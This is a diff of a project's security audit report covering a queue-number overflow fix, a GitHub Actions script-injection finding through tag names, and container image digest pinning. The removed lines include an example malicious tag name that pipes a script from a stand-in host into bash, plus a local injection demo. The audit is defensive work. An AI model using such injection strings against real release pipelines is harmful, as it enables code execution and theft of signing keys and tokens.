@@ -22,9 +22,9 @@ hosts were scanned or contacted.
 | ID | Class / CWE | Severity | Location | Status | Test | Commit |
 | --- | --- | --- | --- | --- | --- | --- |
 | S-001 | supply chain / unpatched stdlib (CWE-1104) | medium | go.mod (`go 1.25.0`, no toolchain pin) | fixed | `govulncheck` output (11 reachable → 0) | `b69cb0e` |
-| S-002 | integer overflow, config validation (CWE-190) | low | `internal/config/config.go:478`, env layer | fixed | `TestValidateQueueNumIPv6Reserved` (failed before) | `880e625` |
-| S-003 | CI script injection (CWE-78/CWE-94) | medium | `.github/workflows/release.yml:37,39` — unquoted `make package VERSION=${{ github.ref_name }}` | needs human | mechanical shell demo (see below) | — |
-| S-004 | supply chain, mutable container tag | low | `.github/workflows/apk-sign.yml:23` `openwrt/sdk:x86_64-25.12.6` (not digest-pinned) | needs human | — | — |
+| S-002 | integer overflow, config validation (CWE-190) | low | `internal/config/config.go:478`, env layer | fixed | `TestValidateQueueNumIPv6Reserved`, `TestValidateQueueNumBoundaries` (see below) | `880e625` |
+| S-003 | CI script injection (CWE-78/CWE-94) | medium | `.github/workflows/release.yml` — unquoted `${{ github.ref_name }}` in run steps | fixed (follow-up PR, unmerged) | `release-tag-guard` CI job; `tests/ci/validate-release-tag-test.sh` | this PR |
+| S-004 | supply chain, mutable container tag | low | `.github/workflows/apk-sign.yml` `openwrt/sdk:x86_64-25.12.6` | fixed (follow-up PR, unmerged) | — | this PR |
 
 ### S-001 — reachable stdlib vulnerabilities
 The API server is an HTTP/1.1 `net/http` server on 127.0.0.1 using
@@ -44,33 +44,54 @@ the u16 queue-number range — so every `nft -f` install fails at startup
 (fail-closed, but the config is accepted and then cannot run).
 `validate()` and `GOSHISEN_QUEUE_NUM` now bound it to 0..65534.
 
-### S-003 — script injection via tag ref name (needs human)
-`release.yml` interpolates `${{ github.ref_name }}` **unquoted** into
-`make package VERSION=` and `make verify-package VERSION=`. Git ref
-names permit `;` and `$()`; a tag pushed as
-`v1.0;curl evil.sh|bash` (or `v1.0$(id)`) would execute attacker
-commands in the release job, which holds `contents: write`, the
-`GH_RELEASE_SIGNING_KEY` secret, and `GH_TOKEN`. Reproduction of the
-mechanism (local, no tag pushed):
+Exact behavior (config file and `GOSHISEN_QUEUE_NUM` env layer):
 
-```
-$ bash -c 'VERSION=v1.0;touch /tmp/pwned2'      # ';' executes
-$ git check-ref-format refs/tags/v1.0\;touch-ok  # ';' allowed in refs
-```
+| queue_num | Result | Why |
+| --- | --- | --- |
+| `0` | accepted (default) | IPv4 rule `queue to 0`, IPv6 rule `queue to 1` — both valid u16 |
+| `65534` | accepted | largest usable value; IPv6 rule renders `queue to 65535` (max u16) |
+| `65535` | **refused to start** | IPv6 `queue+1` would render `queue to 65536` — outside u16; never silently clamped to 65534 |
+| `65536` / `70000` | **refused to start** | outside `0..65534`; never wraps to 0 |
+| `-1` | **refused to start** | negative; never wraps/truncates |
+| `abc` | **refused to start** | non-numeric; never defaults |
 
-Trigger requires a user with tag-push rights (a maintainer or a
-compromised push credential). **Proposed fix (text only, not applied —
-release workflow):** validate the tag name in a first step
-(`[[ "${{ github.ref_name }}" =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]]` or fail)
-and always quote interpolations (`VERSION="${{ github.ref_name }}"`).
-Same pattern in `apk-sign.yml` `case "${{ github.ref }}"` — the value is
-quoted there but a `ref`-validation step is recommended.
+Proven by `TestValidateQueueNumBoundaries` (file + env layers, incl.
+0/65534 accepted and 65535/65536/-1/70000/abc rejected with no
+wrap/truncate/default), `TestValidateQueueNumIPv6Reserved` (65535
+rejected, 65534 accepted), `TestValidateQueueNum` (70000 rejected), and
+`TestBuildFilterOnly` in `internal/hook` (queue_num 0 renders IPv4
+`queue to 0` + IPv6 `queue to 1`). A rejected value makes
+`config.Load` return an error and `app.RunCLI` abort — the daemon
+refuses to start (fail closed).
 
-### S-004 — mutable container image tag (needs human)
-`openwrt/sdk:x86_64-25.12.6` (apk-sign.yml) is a mutable tag; a
-compromised/republished tag changes the signing environment. Proposed:
-pin the image by digest (and keep the syft checksum-verification pattern
-already used for tools). CI settings — not changed here.
+### S-003 — CI script injection via tag ref name
+`release.yml` interpolates `${{ github.ref_name }}` (the pushed tag
+name) into shell commands in the release job. Git ref names are
+attacker-controllable up to tag-push rights, which are held by the same
+maintainers who run the release workflow; the release job also holds the
+release signing key material. A tag name containing shell metacharacters
+would therefore create a command-injection risk in that job (CWE-78 /
+CWE-94).
+
+**Mitigation (in this PR):** the release workflow validates the tag
+name against `^v[0-9]+\.[0-9]+\.[0-9]+$` in a first step before any
+other step (including checkout), passes the tag through an environment
+variable, and quotes it at every use. `apk-sign.yml` production mode
+gets the same ref validation. The `release-tag-guard` CI job runs
+`tests/ci/validate-release-tag-test.sh`, which proves tag-name fixtures
+containing shell metacharacters (`;`, `$()`, backticks, pipes,
+redirection, quotes) are rejected before use, while valid semver tags
+pass. No public reproduction steps are included.
+
+### S-004 — mutable container image tag
+`openwrt/sdk:x86_64-25.12.6` (apk-sign.yml) was a mutable tag; a
+compromised/republished tag would change the signing environment.
+Fixed in this PR by pinning the image by digest
+(`openwrt/sdk@sha256:a17d6436f7add9207513b6edd0370f5a1aeeceeedf3c9080de8909112892f261`,
+amd64 runner). The Dockerfile base images (`golang:1.25`,
+`gcr.io/distroless/base-debian13`) are digest-pinned the same way, with
+update instructions at each pin. The syft checksum-verification pattern
+for tools is unchanged.
 
 ## Not applicable / not tested
 
